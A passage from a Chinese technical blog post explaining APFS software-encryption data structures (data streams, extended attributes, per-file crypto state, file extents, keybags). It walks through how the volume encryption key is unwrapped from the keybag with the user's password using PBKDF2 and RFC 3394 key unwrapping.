之中，但是文件内容和一些属性值的数据量不固定而且可能很大，基于性能考虑，APFS 将这些数据存储在 Data Stream 数据流之中。</p>\n<h4 id=\"DSTREAM-记录\"><a href=\"#DSTREAM-记录\" class=\"headerlink\" title=\"DSTREAM 记录\"></a>DSTREAM 记录</h4><p>每个文件都有一个默认数据流，存储我们通常所说的文件内容。<br>还记得 inode 记录中的<code>private_id</code>吗？这就是每个文件的默认数据流（Data Stream）。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">j_dstream_id_key</span> &#123;</span> </span><br><span class=\"line\">    <span class=\"type\">j_key_t</span> hdr;</span><br><span class=\"line\">&#125; __attribute__((packed));</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">j_dstream_id_key</span> <span class=\"title\">j_dstream_id_key_t</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">j_dstream_id_val</span> &#123;</span> </span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> refcnt;                <span class=\"comment\">// 如果数据流的引用计数清零时，可以删除之</span></span><br><span class=\"line\">&#125; __attribute__((packed));</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">j_dstream_id_val</span> <span class=\"title\">j_dstream_id_val_t</span>;</span></span><br></pre></td></tr></table></figure>\n\n<p>默认数据流的统计信息保存在 inode 记录的<code>APFS_TYPE_EXTENT</code>扩展字段。<br>数据流的占用空间和分配空间可能不一致，例如文件内容没有完全填满最后一个块，此外，由于 AFPS 支持稀疏分配，重复出现的零字节可能不会实际占用存储空间。<br>对于使用<strong>软件加密</strong>的 volume，<code>default_crypto_id</code>字段的值始终为<code>CRYPTO_SW_ID</code>&#x3D;4。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">j_dstream</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> size;                  <span class=\"comment\">// 逻辑数据的大小（以字节为单位）</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> alloced_size;          <span class=\"comment\">// 为数据流分配的总空间（以字节为单位），包括未使用的空间</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> default_crypto_id;     <span class=\"comment\">// <span class=\"doctag\">TODO:</span> 此数据流中使用的默认加密密钥,或 Tweak 密钥</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> total_bytes_written;   <span class=\"comment\">// 已写入此数据流的总字节数</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> total_bytes_read;      <span class=\"comment\">// 已从此数据流读取的总字节数</span></span><br><span class=\"line\">&#125; __attribute__((aligned(<span class=\"number\">8</span>),packed)); </span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">j_dstream</span> <span class=\"title\">j_dstream_t</span>;</span> </span><br></pre></td></tr></table></figure>\n\n<h4 id=\"XATTR-记录\"><a href=\"#XATTR-记录\" class=\"headerlink\" title=\"XATTR 记录\"></a>XATTR 记录</h4><p>古老的 HFS+ 提供了文件系统的<strong>fork</strong>功能，最初设计是为了保存 GUI 使用的非编译数据，例如文件图标、缩略图和应用程序相关的菜单提示信息等，这个功能 AFPS 继承下来，并基于<code>APFS_TYPE_XATTR</code>记录实现。</p>\n<blockquote>\n<p>微软的 NTFS 也有类似功能，称为 ADS（Alternate data stream，替代数据流）</p>\n</blockquote>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">j_xattr_key</span> &#123;</span> </span><br><span class=\"line\">    <span class=\"type\">j_key_t</span> hdr;</span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> name_len;              <span class=\"comment\">// 扩展属性名称的长度（字节单位）</span></span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> name[<span class=\"number\">0</span>];                <span class=\"comment\">// 以NULL结尾的UTF-8编码</span></span><br><span class=\"line\">&#125; __attribute__((packed));</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">j_xattr_key</span> <span class=\"title\">j_xattr_key_t</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">j_xattr_val</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> flags;                 <span class=\"comment\">// 数据存储位置标记：数据流、记录、文件系统</span></span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> xdata_len;             <span class=\"comment\">// 扩展属性的内联数据长度</span></span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> xdata[<span class=\"number\">0</span>];               <span class=\"comment\">// 扩展属性的内容，或者数据流的标识符</span></span><br><span class=\"line\">&#125; __attribute__((packed));</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">j_xattr_val</span> <span class=\"title\">j_xattr_val_t</span>;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-密钥管理\"><a href=\"#3-密钥管理\" class=\"headerlink\" title=\"3. 密钥管理\"></a>3. 密钥管理</h3><p>早期的 HFS+ 采用 AES-CBC 工作模式，存在明文和密文不等长、需要额外存储初始变量等诸多问题，后续改为 AES-XTS 磁盘加密模式，APFS 也是如此，这就需要妥善保管好 Ciper 分组密钥和 Tweak 可调整密钥。</p>\n<h4 id=\"CRYPTO-STATE-记录\"><a href=\"#CRYPTO-STATE-记录\" class=\"headerlink\" title=\"CRYPTO_STATE 记录\"></a>CRYPTO_STATE 记录</h4><p>请注意！本文讨论的是软件加密，也就是单一密钥的 FDE，并不需要管理每个文件的 AES-XTS的主密钥，但 APFS 的设计目标是原生支持 FBE（当然前提是采用硬件加密），因此数据结构的设计目标就是每个文件都有独立的 per-file key，就保存在<code>APFS_TYPE_CRYPTO_STATE</code>记录。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">j_crypto_key</span> &#123;</span> </span><br><span class=\"line\">    <span class=\"type\">j_key_t</span> hdr;</span><br><span class=\"line\">&#125; __attribute__((packed));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">j_crypto_val</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> refcnt; </span><br><span class=\"line\">    <span class=\"type\">wrapped_crypto_state_t</span> state;</span><br><span class=\"line\">&#125; __attribute__((aligned(<span class=\"number\">4</span>),packed)); </span><br></pre></td></tr></table></figure>\n\n<p>进一步，我们来分析<code>wrapped_crypto_state_t</code>的数据结构，可以看到 per-file key 始终是以包裹状态存储的，需要通过安全隔区保存的 Class Key 来解密。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* 持久化存储 per-file key，包含：版本信息 + warpped key data */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">wrapped_crypto_state</span> &#123;</span>               <span class=\"comment\">// </span></span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> major_version;                 <span class=\"comment\">// default = 5，iOS 5开始支持 FBE</span></span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> minor_version;                 <span class=\"comment\">// default = 0</span></span><br><span class=\"line\">    <span class=\"type\">crypto_flags_t</span> cpflags;</span><br><span class=\"line\">    <span class=\"type\">cp_key_class_t</span> persistent_class;        <span class=\"comment\">// 数据保护等级：A/B/C/D</span></span><br><span class=\"line\">    <span class=\"type\">cp_key_os_version_t</span> key_os_version;     <span class=\"comment\">// OS版本号，例如：18-A-391</span></span><br><span class=\"line\">    <span class=\"type\">cp_key_revision_t</span> key_revision;</span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> key_len；</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> persistent_key[<span class=\"number\">0</span>];              <span class=\"comment\">// warpped per-file key ！！！</span></span><br><span class=\"line\">&#125; __attribute__((aligned(<span class=\"number\">2</span>), packed));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* 结构相似，但没有密钥数据！仅用于 AFPS Superblock，因为总是使用单一密钥 VEK */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">wrapped_meta_crypto_state</span> &#123;</span>          </span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> major_version;                 </span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> minor_version;                 </span><br><span class=\"line\">    <span class=\"type\">crypto_flags_t</span> cpflags;</span><br><span class=\"line\">    <span class=\"type\">cp_key_class_t</span> persistent_class;        </span><br><span class=\"line\">    <span class=\"type\">cp_key_os_version_t</span> key_os_version;     </span><br><span class=\"line\">    <span class=\"type\">cp_key_revision_t</span> key_revision;</span><br><span class=\"line\">    <span class=\"type\">uint16_t</span>  unused;</span><br><span class=\"line\">&#125; __attribute__((aligned(<span class=\"number\">2</span>), packed));</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"FILE-EXTENT-记录\"><a href=\"#FILE-EXTENT-记录\" class=\"headerlink\" title=\"FILE_EXTENT 记录\"></a>FILE_EXTENT 记录</h4><p>还记得 HFS+ 是如何实现 HBE 的吗？就是将<code>per-file key</code>保存在文件扩展信息中。APFS 继承了这种方式，将 Tweak key 保存在<code>APFS_TYPE_FILE_EXTENT</code>记录中。</p>\n<p>需要注意的是，由于APFS 支持 COW（Copy On Write，写入时拷贝），可以实现零损耗的大文件快速克隆。但是，如果一个文件被 Clone 以后，每个副本都会获得一个新密钥以接受后续可能的数据写入，久而久之，一个文件可能会由不同的范围（或片段）组成，每个映射到不同的密钥，为此可能需要多个<code>AFPS_FILE_EXTENT</code>记录。</p>\n<p>此外，由于 Tweak Key 属于密钥白化技术，不允许重复使用，但可以被公开，因此 crypto_id 可以明文存储。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">j_file_extent_key</span> &#123;</span> </span><br><span class=\"line\">    <span class=\"type\">j_key_t</span> hdr;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> logical_addr;</span><br><span class=\"line\">&#125; __attribute__((packed));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">j_file_extent_val</span> &#123;</span> </span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> len_and_flags;         <span class=\"comment\">// 最高8位是标记位（当前未使用），后续56位是数据块长度（字节单位）</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> phys_block_num;        <span class=\"comment\">// 第一个块的物理块号</span></span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> crypto_id;             <span class=\"comment\">// FDE 模式下存储 Tweak Key！如果未加密，置为0</span></span><br><span class=\"line\">&#125; __attribute__((packed));</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">j_file_extent_val</span> <span class=\"title\">j_file_extent_val_t</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> J_FILE_EXTENT_LEN_MASK      0x00ffffffffffffffULL</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> J_FILE_EXTENT_FLAG_MASK     0xff00000000000000ULL      </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> J_FILE_EXTENT_FLAG_SHIFT    56</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"关于-crypto-id-的讨论\"><a href=\"#关于-crypto-id-的讨论\" class=\"headerlink\" title=\"关于 crypto_id 的讨论\"></a>关于 crypto_id 的讨论</h5><ul>\n<li>该字段的默认值是此区段所属的数据流的<code>j_dstream_t</code>的<code>default_crypto_id</code>字段的值</li>\n<li>如果在 Volume 设置了<code>APFS_FS_ONEKEY</code>标志，即单一密钥模式，该字段存储 AES-XTS 的 Tweak key</li>\n<li>否则，该字段存储数据与<code>j_crypto_key_t</code>记录的<code>obj_id</code>字段保持一致，表明将采用 FBE 模式，此时这里不需要存储 Tweak key</li>\n</ul>\n<blockquote>\n<p>根据 Apple 安全隔区白皮书的说明：<br>在搭载 A14 和 M1 的设备上， 加密在 XTS 模式中使用 AES-256， 其中 256 位文件独有密钥通过密钥派生功能 (NIST Special Publication 800-108) 派生出一个 256 位 tweak 密钥和一个 256 位 cipher 密钥。<br>采用 A9 到 A13、 S5 和 S6 的每一代硬件在 XTS 模式中使用 AES-128， 其中 256 位文件独有密钥会被拆分， 以提供一个 128 位 tweak 密钥和一个 128 位 cipher 密钥。</p>\n</blockquote>\n<h2 id=\"五、Keybag\"><a href=\"#五、Keybag\" class=\"headerlink\" title=\"五、Keybag\"></a>五、Keybag</h2><p>APFS 的设计原生支持加密，不再需要 HFS+ 上叠加的 CoreStorge 虚拟存储层，但具体加密方式取决于硬件设备的功能。硬件加密用于具备 Secure Encalve 安全隔区的内部存储设备，软件加密用于不支持硬件加密的外部和内部存储设备。需要注意的是，当使用硬件加密时，数据无法在任何其他设备上解密，安全芯片必须代理所有解密操作。</p>\n<p>对于 macOS，APFS 使用单一密钥 VEK（Volume Encryption Key，卷宗加密密钥）访问宗卷上的加密内容（也就是<strong>所有文件的 AES-XTS 分组密钥</strong>），VEK 以 Warpped 状态存储在磁盘，封装在多层加密中。</p>\n<p>KEK（Key Encryption Key，密钥加密密钥）是用于打开 VEK 的包裹密钥，以加密形式存储在磁盘上。每个 Volume 都有自己的 KEK ，而且还有多个副本以提供不同场景下的用户访问，这些副本都使用不同的密钥进行加密（包装），包括：</p>\n<ul>\n<li>User Password：用户输入登录密码</li>\n<li>Personal recovery key：个人备份密钥，该密钥在驱动器格式化时生成，并由用户纸质保存</li>\n<li>Institutional recovery key：授权的外部机构恢复密钥</li>\n<li>iCloud recovery key：客户与 Apple 技术支持配合使用</li>\n</ul>\n<p><img src=\"/2024/02/11/Apple-File-System%E7%9A%84%E8%BD%AF%E4%BB%B6%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/keybag.png\" alt=\"L1\"></p>\n<h3 id=\"1-Keybag-的存储方式\"><a href=\"#1-Keybag-的存储方式\" class=\"headerlink\" title=\"1. Keybag 的存储方式\"></a>1. Keybag 的存储方式</h3><p>早期的 iOS 将密钥包存储在一个普通的数据文件中（<code>/private/var/keybags/systembag.kb</code>），虽然做了很复杂的加密处理，但由于缺少防重放机制，无法有效抵御暴力破解。APFS 是基于文件系统的全新设计，密钥包不再依赖于数据文件，而是被设计为一个特殊的对象（Object）。</p>\n<p>Container Keybag 的入口在其超级块<code>nx_superblock_t</code>的<code>prangnx_keylocker</code>字段，数据类型是<code>prange_t</code>，保存着容器密钥包的物理地址，其数据结构是：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* keybag 的头部 */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kb_locker</span> &#123;</span> </span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> kl_version;            <span class=\"comment\">// 版本号，目前为 2</span></span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> kl_nkeys;              <span class=\"comment\">// 包含了几个条目</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> kl_nbytes;</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> padding[<span class=\"number\">8</span>]; </span><br><span class=\"line\">    <span class=\"type\">keybag_entry_t</span> kl_entries[];    <span class=\"comment\">// 密钥条目数组，结构见下</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kb_locker</span> <span class=\"title\">kb_locker_t</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* keybag 的各个条目 */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">keybag_entry</span> &#123;</span> </span><br><span class=\"line\">    <span class=\"type\">uuid_t</span> ke_uuid;                 <span class=\"comment\">// 如果是容器，存储Volume UUID；如果是Volume，存储User UUID</span></span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> ke_tag;                <span class=\"comment\">// 标签，定义见下</span></span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> ke_keylen;             <span class=\"comment\">// </span></span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> padding[<span class=\"number\">4</span>]; </span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> ke_keydata[];           <span class=\"comment\">// 内容数据块!!!</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">keybag_entry</span> <span class=\"title\">keybag_entry_t</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> APFS_VOL_KEYBAG_ENTRY_MAX_SIZE 512</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> APFS_FV_PERSONAL_RECOVERY_KEY_UUID ”EBC6C064-0000-11AA-AA11-00306543ECAC”</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* keybag 的标签定义 */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">enum</span> &#123;</span></span><br><span class=\"line\">    KB_TAG_UNKNOWN = <span class=\"number\">0</span>, </span><br><span class=\"line\">    KB_TAG_RESERVED_1 = <span class=\"number\">1</span>, </span><br><span class=\"line\">    KB_TAG_VOLUME_KEY = <span class=\"number\">2</span>,              <span class=\"comment\">// 标记是wrapped VEK，仅用于容器密钥包</span></span><br><span class=\"line\">    KB_TAG_VOLUME_UNLOCK_RECORDS = <span class=\"number\">3</span>,   <span class=\"comment\">// MacOS专用！容器和卷宗的解锁信息，具体见下文</span></span><br><span class=\"line\">    KB_TAG_VOLUME_PASSPHRASE_HINT = <span class=\"number\">4</span>,  <span class=\"comment\">// MacOS专用！user password的提示语（明文）</span></span><br><span class=\"line\">    KB_TAG_WRAPPING_M_KEY = <span class=\"number\">5</span>,          <span class=\"comment\">// iOS专用！media key 的包裹密钥</span></span><br><span class=\"line\">    KB_TAG_VOLUME_M_KEY = <span class=\"number\">6</span>,            <span class=\"comment\">// iOS专用！本volume的media key</span></span><br><span class=\"line\">    KB_TAG_RESERVED_F8 = <span class=\"number\">0xF8</span> </span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>对于 Container Keybag，容器包含了几个加密的 Volume，就有几个 entry：</p>\n<ul>\n<li>每个 entry 的<code>ke_uuid</code>存储了这个 volume 的 UUID，也是后续用于解封 volume keybag 的钥匙</li>\n<li>每个 entry 的<code>ke_keydata</code>存储了这个 volume keybag 的物理地址</li>\n</ul>\n<p>对于 Volume Keybag ，卷宗包含了几个 User，就有几个 entry</p>\n<ul>\n<li>每个 entry 的<code>ke_uuid</code>存储了这个 User 的 UUID</li>\n<li>每个 entry 的<code>ke_keydata</code>存储了这个 User 的 wrapped KEK</li>\n</ul>\n<h3 id=\"2-VEK-的解封流程\"><a href=\"#2-VEK-的解封流程\" class=\"headerlink\" title=\"2. VEK 的解封流程\"></a>2. VEK 的解封流程</h3><p>要完成数据文件的解密，是一个漫长而复杂的流程。</p>\n<h4 id=\"Step-1-解封-Container-Keybag\"><a href=\"#Step-1-解封-Container-Keybag\" class=\"headerlink\" title=\"Step 1: 解封 Container Keybag\"></a>Step 1: 解封 Container Keybag</h4><ul>\n<li>读取容器超级块的<code>nx_keylocker</code>字段，找到容器密钥包的物理位置。然而你不能直接看到数据，因为密钥包的内容被加密了。</li>\n<li>执行解密算法<a href=\"https://www.rfc-editor.org/rfc/rfc3394\">RFC 3394 - AES密钥包裹算法</a>，密钥就是该容器的 UUID，即容器超级块的<code>nx_uuid</code>字段。</li>\n</ul>\n<p>现在，你就能看到容器密钥包的数据内容了。</p>\n<blockquote>\n<p>此处<a href=\"https://jtsylve.blog/post/2022/12/21/APFS-Keybags\">JOE 的参考文档</a>和 APFS 官方文档不一致</p>\n</blockquote>\n<h4 id=\"Step-2-找到-wrapped-VEK\"><a href=\"#Step-2-找到-wrapped-VEK\" class=\"headerlink\" title=\"Step 2: 找到 wrapped VEK\"></a>Step 2: 找到 wrapped VEK</h4><p>分析容器密钥包，找到一个标记为<code>KB_TAG_VOLUME_KEY</code>的 entry，其<code>ke_keydata</code>字段就是 wrapped VEK。<br>先保存下来，后面还要用。</p>\n<h4 id=\"Step-3-解封-Volume-Keybag\"><a href=\"#Step-3-解封-Volume-Keybag\" class=\"headerlink\" title=\"Step 3: 解封 Volume Keybag\"></a>Step 3: 解封 Volume Keybag</h4><ul>\n<li>继续分析容器密钥包，找出标记为<code>KB_TAG_VOLUME_KEY</code>的 entry，可能有多个分别对应不同的卷宗.<br>  每个 entry 的<code>ke_uuid</code>字段是 volume UUID，<code>ke_keydata</code>字段是 volume keybag 的物理地址</li>\n<li>根据 Volume keybag 的物理地址读取数据，然而你还是看不到内容，因为又被加密了。<br>  仍然执行解密算法 RFC 3394，密钥是该 volume 的 UUID</li>\n<li>标记为<code>KB_TAG_VOLUME_PASSPHRASE_HINT</code>的 entry，其<code>ke_keydata</code>存储人类可读的密码提示信息</li>\n</ul>\n<p>现在，你就能看到卷宗密钥包的数据内容了，示例如下：</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">名字</th>\n<th align=\"center\">UUID</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">INSTITUTIONAL_RECOVERY_UUID</td>\n<td align=\"center\">{C064EBC6-0000-11AA-AA11-00306543ECAC}</td>\n</tr>\n<tr>\n<td align=\"center\">INSTITUTIONAL_USER_UUID</td>\n<td align=\"center\">{2FA31400-BAFF-4DE7-AE2A-C3AA6E1FD340}</td>\n</tr>\n<tr>\n<td align=\"center\">PERSIONAL_RECOVERY_UUID</td>\n<td align=\"center\">{EBC6C064-0000-11AA-AA11-00306543ECAC}</td>\n</tr>\n<tr>\n<td align=\"center\">ICLOUD_RECOVERY_UUID</td>\n<td align=\"center\">{64C0C6EB-0000-11AA-AA11-00306543ECAC}</td>\n</tr>\n<tr>\n<td align=\"center\">ICLOUD_USER_UUID</td>\n<td align=\"center\">{EC1C2AD9-B618-4ED6-BD8D-50F361C27507}</td>\n</tr>\n</tbody></table>\n<h4 id=\"Step-4-找到-wrapped-KEK\"><a href=\"#Step-4-找到-wrapped-KEK\" class=\"headerlink\" title=\"Step 4: 找到 wrapped KEK\"></a>Step 4: 找到 wrapped KEK</h4><p>分析卷宗密钥包，包含了多个 entry，分别对应不同的 User，也是不同的业务场景。</p>\n<p>以用户密码方式为例，你需要找出一条 entry，其<code>ke_uuid</code>是某个<code>User Open Directory UUID</code>，而且标记为<code>KB_TAG_VOLUME_UNLOCK_RECORDS</code>，其<code>ke_keydata</code>字段就是这个场景的 wrapped KEK。</p>\n<h4 id=\"Step-5-解封-KEK\"><a href=\"#Step-5-解封-KEK\" class=\"headerlink\" title=\"Step 5: 解封 KEK\"></a>Step 5: 解封 KEK</h4><p>KEK 是基于 <a href=\"https://en.wikipedia.org/wiki/X.690#DER_encoding\">DER 编码</a>的数据块，其结构为：</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">KEKBLOB ::= SEQUENCE &#123;</span><br><span class=\"line\">    unknown [<span class=\"number\">0</span>] INTEGER</span><br><span class=\"line\">    hmac    [<span class=\"number\">1</span>] OCTET STRING                <span class=\"comment\">// 校验值</span></span><br><span class=\"line\">    salt    [<span class=\"number\">2</span>] OCTET STRING</span><br><span class=\"line\">    keyblob [<span class=\"number\">3</span>] SEQUENCE &#123;</span><br><span class=\"line\">        unknown     [<span class=\"number\">0</span>] INTEGER</span><br><span class=\"line\">        uuid        [<span class=\"number\">1</span>] OCTET STRING        <span class=\"comment\">// Volume User UUID</span></span><br><span class=\"line\">        flags       [<span class=\"number\">2</span>] INTEGER             <span class=\"comment\">// 标记是基于CoreStorage，APFS软件加密，或硬件加密</span></span><br><span class=\"line\">        wrapped_key [<span class=\"number\">3</span>] OCTET STRING        <span class=\"comment\">// </span></span><br><span class=\"line\">        iterations  [<span class=\"number\">4</span>] INTEGER             <span class=\"comment\">// 迭代次数</span></span><br><span class=\"line\">        salt        [<span class=\"number\">5</span>] OCTET STRING        <span class=\"comment\">// 盐值</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>数据块的头部有一个 基于 HMAC-SHA256 算法的校验值，算法是：<br><code>hmac_key := SHA256(&quot;\\x01\\x16\\x20\\x17\\x15\\x05&quot; + salt)</code></p>\n<p>Flags 标记了 KEK 的包裹方式，格式如下：</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">Name</th>\n<th align=\"center\">Value</th>\n<th align=\"center\">Description</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">KEK_FLAG_CORESTORAGE</td>\n<td align=\"center\">0x00010000’0000000000</td>\n<td align=\"center\">Key is a legacy CoreStorage KEK</td>\n</tr>\n<tr>\n<td align=\"center\">KEK_FLAG_HARDWARE</td>\n<td align=\"center\">0x00020000’0000000000</td>\n<td align=\"center\">Key is hardware encrypted</td>\n</tr>\n</tbody></table>\n<p>解密算法是 PBKDF2 和 RFC 3394，你必须知道 User Password 并计算出 Passcode Key，才能正确解封 wrapped KEK，算法是：</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Calculate size of wrapping key (in bytes)</span></span><br><span class=\"line\">key_size := (flags &amp; KEK_FLAG_CORESTORAGE) ? <span class=\"number\">16</span> : <span class=\"number\">32</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Generate unwrapping key from user&#x27;s password</span></span><br><span class=\"line\">key := pbkdf2_hmac_sha256(password, salt, iterations, key_size)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Unwrap the encrypted KEK</span></span><br><span class=\"line\">kek := rfc3394_unwrap(key, wrapped_key);</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Step-6-解封-VEK\"><a href=\"#Step-6-解封-VEK\" class=\"headerlink\" title=\"Step 6: 解封 VEK\"></a>Step 6: 解封 VEK</h4><p>KEK 也是基于 <a href=\"https://en.wikipedia.org/wiki/X.690#DER_encoding\">DER 编码</a>的数据块，结构更简单：</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">VEKBLOB ::= SEQUENCE &#123;</span><br><span class=\"line\">    unknown [<span class=\"number\">0</span>] INTEGER</span><br><span class=\"line\">    hmac    [<span class=\"number\">1</span>] OCTET STRING</span><br><span class=\"line\">    salt    [<span class=\"number\">2</span>] OCTET STRING</span><br><span class=\"line\">    keyblob [<span class=\"number\">3</span>] SEQUENCE &#123;</span><br><span class=\"line\">        unknown     [<span class=\"number\">0</span>] INTEGER</span><br><span class=\"line\">        uuid        [<span class=\"number\">1</span>] OCTET STRING</span><br><span class=\"line\">        flags       [<span class=\"number\">2</span>] INTEGER</span><br><span class=\"line\">        wrapped_key [<span class=\"number\">3</span>] OCTET STRING</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>解密算法就是简单的 RFC 3394。<br><code>vek = rfc3394_unwrap(vek, wrapped_key)</code></p>\n<p>至此，我们终于获得了核心密钥 VEK ！！！</p>\n<h3 id=\"3-文件解密的流程\"><a href=\"#3-文件解密的流程\" class=\"headerlink\" title=\"3. 文件解密的流程\"></a>3. 文件解密的流程</h3><p>APFS 采用 XTS-AES-128 磁盘加密模式，该密码使用 256 位分组密钥和 64 位调整值。此调整值取决于位置。它允许对相同的明文进行加密并存储在磁盘上的不同位置，并且在使用相同的 AES 密钥时具有截然不同的密文。每 512 字节的加密数据使用基于块初始存储的容器偏移量的调整。</p>\n<p>要顺利完成文件内容解密，前提条件包括：</p>\n<ol>\n<li>准确解析文件系统的B-Tree</li>\n<li>解析密钥包，找到分组密钥 Ciper Key，也即是 VEK</li>\n<li>找到文件密钥，也就是 Tweak key</li>\n</ol>\n<h4 id=\"文件元数据的解密\"><a href=\"#文件元数据的解密\" class=\"headerlink\" title=\"文件元数据的解密\"></a>文件元数据的解密</h4><p>卷的对象映射永远不会加密，但其引用的虚拟对象可能会加密，就像加密卷上的 FS 树节点一样。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">omap_val</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> ov_flags; <span class=\"comment\">// 0x00</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> ov_size;  <span class=\"comment\">// 0x04</span></span><br><span class=\"line\">    <span class=\"type\">paddr_t</span> ov_paddr;  <span class=\"comment\">// 0x08</span></span><br><span class=\"line\">&#125; <span class=\"type\">omap_val_t</span>;        <span class=\"comment\">// 